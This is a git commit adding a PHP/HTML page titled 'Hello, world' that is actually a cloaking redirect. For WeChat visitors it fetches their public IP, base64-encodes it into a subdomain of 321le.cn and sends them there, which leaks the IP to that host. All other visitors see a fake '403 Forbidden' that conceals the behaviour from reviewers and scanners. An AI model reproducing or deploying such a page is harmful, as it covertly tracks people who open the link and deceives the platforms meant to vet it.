0858397212a5d7cb9a67833b8e622f5874935295
321lecloud <138575758+321lecloud@users.noreply.github.com>
2023-07-04 18:06:30 +0800

    Update and rename danchaofan.html to danchaofan.php

---
+++ danchaofan.php
@@ -0,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>你好，世界</title>
+</head>
+<body>
+    <script>
+        var userAgent = navigator.userAgent;
+        
+        // 判断是否在微信环境中访问
+        if (userAgent.indexOf('MicroMessenger') !== -1) {
+            // 获取当前用户IP
+            var userIp = '';
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIp = data.ip;
+                    
+                    // 将IP转化为64位编码
+                    var encodedIp = btoa(userIp);
+                    
+                    // 拼接跳转URL
+                    var redirectUrl = 'http://' + encodedIp + '.321le.cn';
+                    
+                    // 执行重定向跳转
+                    window.location.href = redirectUrl;
+                })
+                .catch(error => {
+                    console.error('获取IP地址失败:', error);
+                });
+        } else {
+            // 非微信环境下显示403 Forbidden错误
+            document.body.innerHTML = '<h1>403 Forbidden</h1>';
+        }
+    </script>
+</body>
+</html>
